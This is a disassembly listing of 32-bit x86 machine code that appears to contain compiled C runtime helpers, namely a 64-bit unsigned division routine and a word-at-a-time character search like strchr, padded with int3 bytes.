  4289fc:	int3   
  4289fd:	int3   
  4289fe:	int3   
  4289ff:	int3   
  428a00:	push   esi
  428a01:	mov    eax,DWORD PTR [esp+0x14]
  428a05:	or     eax,eax
  428a07:	jne    0x428a31
  428a09:	mov    ecx,DWORD PTR [esp+0x10]
  428a0d:	mov    eax,DWORD PTR [esp+0xc]
  428a11:	xor    edx,edx
  428a13:	div    ecx
  428a15:	mov    ebx,eax
  428a17:	mov    eax,DWORD PTR [esp+0x8]
  428a1b:	div    ecx
  428a1d:	mov    esi,eax
  428a1f:	mov    eax,ebx
  428a21:	mul    DWORD PTR [esp+0x10]
  428a25:	mov    ecx,eax
  428a27:	mov    eax,esi
  428a29:	mul    DWORD PTR [esp+0x10]
  428a2d:	add    edx,ecx
  428a2f:	jmp    0x428a78
  428a31:	mov    ecx,eax
  428a33:	mov    ebx,DWORD PTR [esp+0x10]
  428a37:	mov    edx,DWORD PTR [esp+0xc]
  428a3b:	mov    eax,DWORD PTR [esp+0x8]
  428a3f:	shr    ecx,1
  428a41:	rcr    ebx,1
  428a43:	shr    edx,1
  428a45:	rcr    eax,1
  428a47:	or     ecx,ecx
  428a49:	jne    0x428a3f
  428a4b:	div    ebx
  428a4d:	mov    esi,eax
  428a4f:	mul    DWORD PTR [esp+0x14]
  428a53:	mov    ecx,eax
  428a55:	mov    eax,DWORD PTR [esp+0x10]
  428a59:	mul    esi
  428a5b:	add    edx,ecx
  428a5d:	jb     0x428a6d
  428a5f:	cmp    edx,DWORD PTR [esp+0xc]
  428a63:	ja     0x428a6d
  428a65:	jb     0x428a76
  428a67:	cmp    eax,DWORD PTR [esp+0x8]
  428a6b:	jbe    0x428a76
  428a6d:	dec    esi
  428a6e:	sub    eax,DWORD PTR [esp+0x10]
  428a72:	sbb    edx,DWORD PTR [esp+0x14]
  428a76:	xor    ebx,ebx
  428a78:	sub    eax,DWORD PTR [esp+0x8]
  428a7c:	sbb    edx,DWORD PTR [esp+0xc]
  428a80:	neg    edx
  428a82:	neg    eax
  428a84:	sbb    edx,0x0
  428a87:	mov    ecx,edx
  428a89:	mov    edx,ebx
  428a8b:	mov    ebx,ecx
  428a8d:	mov    ecx,eax
  428a8f:	mov    eax,esi
  428a91:	pop    esi
  428a92:	ret    0x10
  428a95:	int3   
  428a96:	int3   
  428a97:	int3   
  428a98:	int3   
  428a99:	int3   
  428a9a:	int3   
  428a9b:	int3   
  428a9c:	int3   
  428a9d:	int3   
  428a9e:	int3   
  428a9f:	int3   
  428aa0:	lea    eax,[edx-0x1]
  428aa3:	pop    ebx
  428aa4:	ret    
  428aa5:	lea    esp,[esp+0x0]
  428aac:	lea    esp,[esp+0x0]
  428ab0:	xor    eax,eax
  428ab2:	mov    al,BYTE PTR [esp+0x8]
  428ab6:	push   ebx
  428ab7:	mov    ebx,eax
  428ab9:	shl    eax,0x8
  428abc:	mov    edx,DWORD PTR [esp+0x8]
  428ac0:	test   edx,0x3
  428ac6:	je     0x428add
  428ac8:	mov    cl,BYTE PTR [edx]
  428aca:	add    edx,0x1
  428acd:	cmp    cl,bl
  428acf:	je     0x428aa0
  428ad1:	test   cl,cl
  428ad3:	je     0x428b26
  428ad5:	test   edx,0x3
  428adb:	jne    0x428ac8
  428add:	or     ebx,eax
  428adf:	push   edi
  428ae0:	mov    eax,ebx
  428ae2:	shl    ebx,0x10
  428ae5:	push   esi
  428ae6:	or     ebx,eax
  428ae8:	mov    ecx,DWORD PTR [edx]
  428aea:	mov    edi,0x7efefeff
  428aef:	mov    eax,ecx
  428af1:	mov    esi,edi
  428af3:	xor    ecx,ebx
  428af5:	add    esi,eax
  428af7:	add    edi,ecx
  428af9:	xor    ecx,0xffffffff
  428afc:	xor    eax,0xffffffff
  428aff:	xor    ecx,edi
  428b01:	xor    eax,esi
  428b03:	add    edx,0x4
  428b06:	and    ecx,0x81010100
  428b0c:	jne    0x428b2a
  428b0e:	and    eax,0x81010100
  428b13:	je     0x428ae8
  428b15:	and    eax,0x1010100
  428b1a:	jne    0x428b24
  428b1c:	and    esi,0x80000000
  428b22:	jne    0x428ae8
  428b24:	pop    esi
  428b25:	pop    edi
  428b26:	pop    ebx
  428b27:	xor    eax,eax
  428b29:	ret    
  428b2a:	mov    eax,DWORD PTR [edx-0x4]
  428b2d:	cmp    al,bl
  428b2f:	je     0x428b67
  428b31:	test   al,al
  428b33:	je     0x428b24
  428b35:	cmp    ah,bl
  428b37:	je     0x428b60
  428b39:	test   ah,ah
  428b3b:	je     0x428b24
  428b3d:	shr    eax,0x10
  428b40:	cmp    al,bl
  428b42:	je     0x428b59
  428b44:	test   al,al
  428b46:	je     0x428b24
  428b48:	cmp    ah,bl
  428b4a:	je     0x428b52
  428b4c:	test   ah,ah
  428b4e:	je     0x428b24
  428b50:	jmp    0x428ae8
  428b52:	pop    esi
  428b53:	pop    edi
  428b54:	lea    eax,[edx-0x1]
  428b57:	pop    ebx
  428b58:	ret    
  428b59:	lea    eax,[edx-0x2]
  428b5c:	pop    esi
  428b5d:	pop    edi
  428b5e:	pop    ebx
  428b5f:	ret    
  428b60:	lea    eax,[edx-0x3]
  428b63:	pop    esi
  428b64:	pop    edi
  428b65:	pop    ebx
  428b66:	ret    
  428b67:	lea    eax,[edx-0x4]
  428b6a:	pop    esi
  428b6b:	pop    edi
  428b6c:	pop    ebx
  428b6d:	ret    
  428b6e:	jmp    DWORD PTR ds:0x42905c
